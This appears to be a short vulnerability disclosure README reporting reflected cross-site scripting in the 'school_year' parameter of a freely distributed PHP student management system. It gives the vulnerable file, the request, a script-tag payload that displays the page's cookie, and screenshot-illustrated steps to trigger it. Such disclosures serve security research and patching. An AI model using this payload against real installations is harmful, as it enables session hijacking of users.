# Student-Management-System-v1.0-has-Cross-site-Scripting-XSS-
Student Management System In PHP With Source Code has Cross-site Scripting (XSS)

Vul_Author: LeiPudd

vendors: https://itsourcecode.com/free-projects/php-project/student-management-system-in-php-with-source-code/

Vulnerability File: /grading/rms.php

Vulnerability location: GET /grading/rms.php?page=candidates_report&school_year=2019-2020 HTTP/1.1\r\n

[+] Payload: <script>alert(document.cookie)</script>

Tested on Windows 11, phpStudy

There is an example with alert:

![image](https://github.com/user-attachments/assets/1559d239-ba04-4621-981a-ec01066c901e)

When you enter the system,click 'Reports', and after that click on "Candidates Report".

![image-20240928181844675](https://github.com/user-attachments/assets/513d2455-b256-42e8-b8ae-68f87af9c8f4)

You can see the URL is http://localhost/grading/rms.php?page=candidates_report&school_year=2019-2020. We replace 'school_year=2019-2020' with
```sql
school_year=<script>alert(document.cookie)</script>
```
![image-20240928182358034](https://github.com/user-attachments/assets/56125c54-3185-4ea2-aa19-6ea43f8759c4)
then press Enter, you will obtain its cookie.
![image](https://github.com/user-attachments/assets/8b8cb463-dbaf-4643-8204-3e7d255018f0)
